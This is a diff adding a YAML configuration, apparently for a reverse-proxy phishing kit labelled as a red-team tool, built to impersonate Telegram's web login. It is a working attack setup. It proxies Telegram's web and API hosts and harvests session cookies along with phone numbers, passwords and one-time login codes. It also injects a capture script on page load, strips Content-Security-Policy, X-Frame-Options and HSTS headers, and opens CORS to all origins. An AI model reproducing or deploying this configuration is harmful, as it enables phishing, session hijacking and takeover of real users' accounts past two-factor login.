@@ -1,0 +1,41 @@
+name: "Telegram"
+author: "Vanta v5 Red Team"
+min_ver: "5.0.0"
+proxy_hosts:
+  - subdomain: "web"
+    target: "web.telegram.org"
+  - subdomain: "api"
+    target: "api.telegram.org"
+auth_urls: 
+  - "/auth"
+  - "/login"
+  - "/k"
+landing_path: ["/k"]
+auth_tokens:
+  - {type: "cookie", name: "tg_user"}
+  - {type: "cookie", name: "tg_hash"}
+  - {type: "cookie", name: "dc"}
+credentials:
+  - {type: "post_param", name: "phone", regex: "^\\+[0-9]{1,15}$"}
+  - {type: "post_param", name: "password", regex: null}
+  - {type: "post_param", name: "code", regex: "^[0-9]{5}$"}
+injections:
+  - {type: "js", path: "/core/assets/js/capture.js", trigger: "load"}
+headers:
+  - {action: "remove", name: "Content-Security-Policy"}
+  - {action: "remove", name: "X-Frame-Options"}
+  - {action: "remove", name: "Strict-Transport-Security"}
+path_rewrites:
+  - {pattern: "^/k/$", replace: "/k/", methods: ["GET"]}
+cookie_rewrites: []
+blocklist:
+  - {pattern: "analytics|telemetry|/track/", mimes: ["text/javascript"], max_kb: 512}
+form_actions:
+  - {selector: "form[action*='send']", action_to: "/api/sendCode"}
+  - {selector: "form[action*='sign']", action_to: "/api/signIn"}
+bridges:
+  - {prefix: "/api/", target_host: "api.telegram.org", strip_prefix: true, cors: "allow_all"}
+cors:
+  mode: "allow_all"
+  methods: ["GET", "POST", "OPTIONS"]
+  headers: ["*"]
